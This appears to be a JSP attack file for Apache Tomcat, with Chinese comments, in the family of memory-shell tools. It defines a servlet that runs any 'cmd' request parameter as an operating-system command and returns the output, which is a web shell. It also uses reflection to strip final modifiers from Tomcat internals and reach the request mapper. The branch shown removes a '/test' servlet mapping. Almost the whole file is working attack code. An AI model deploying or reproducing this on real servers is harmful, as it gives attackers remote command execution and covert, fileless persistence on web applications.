<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.ContainerBase" %>

<%
    class TomcatServlet extends HttpServlet {

        @Override
        public void init() throws ServletException {
        }

        @Override
        protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
            String cmd;
            if ((cmd = req.getParameter("cmd")) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }
                resp.getOutputStream().write(stringBuilder.toString().getBytes());
                resp.getOutputStream().flush();
                resp.getOutputStream().close();
                return;
            }
        }

        @Override
        public void destroy() {
            super.destroy();
        }

    }
%>


<%
    class test {

    }
%>
<%
    try{
        //获取各字段
        java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
        Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
        java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
        java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");

        //去掉final修饰符
        java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");
        modifiers.setAccessible(true);
        modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
        modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

        //设置允许访问
        WRAP_SAME_OBJECT.setAccessible(true);
        lastServicedRequest.setAccessible(true);
        lastServicedResponse.setAccessible(true);

        //如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果
        if(!WRAP_SAME_OBJECT.getBoolean(null)){
            WRAP_SAME_OBJECT.setBoolean(null,true);
            lastServicedRequest.set(null,new ThreadLocal());
            lastServicedResponse.set(null,new ThreadLocal());
            out.println("WRAP_SAME_OBJECT change success!please try again for Inject Servlet");
        }else{
            ThreadLocal<javax.servlet.ServletRequest> threadLocalRequest = (ThreadLocal<javax.servlet.ServletRequest>) lastServicedRequest.get(null);
            javax.servlet.ServletRequest request1 = threadLocalRequest.get();
            try {
                //获取servletContext
                javax.servlet.ServletContext servletContext=request1.getServletContext();

                //获取applicationContext
                java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
                //获取standardContext
                contextField=applicationContext.getClass().getDeclaredField("context");
                contextField.setAccessible(true);
                org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

                Field serviceF = applicationContext.getClass().getDeclaredField("service");
                serviceF.setAccessible(true);
                StandardService service = (StandardService) serviceF.get(applicationContext);
                Mapper mapper = service.getMapper();
                Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
                contextObjectToContextVersionMapF.setAccessible(true);
                ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);
                Object contextVersion = contextObjectToContextVersionMap.get(standardContext);
                java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                stateField.setAccessible(true);
                Wrapper wrapper = (Wrapper) standardContext.findChild("test");
                if(wrapper ==null) {
                    Field parent = ContainerBase.class.getDeclaredField("parent");
                    parent.setAccessible(true);
                    Class[] classes = mapper.getClass().getDeclaredClasses();
                    Class contextversionClass = classes[1];
                    Method removeWrapper = mapper.getClass().getDeclaredMethod("removeWrapper", contextversionClass, String.class);
                    removeWrapper.setAccessible(true);
                    removeWrapper.invoke(mapper, contextVersion, "/test");
                    out.println("delete success");
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }catch (Exception e){
        e.printStackTrace();
    }
%>
</body>
</html>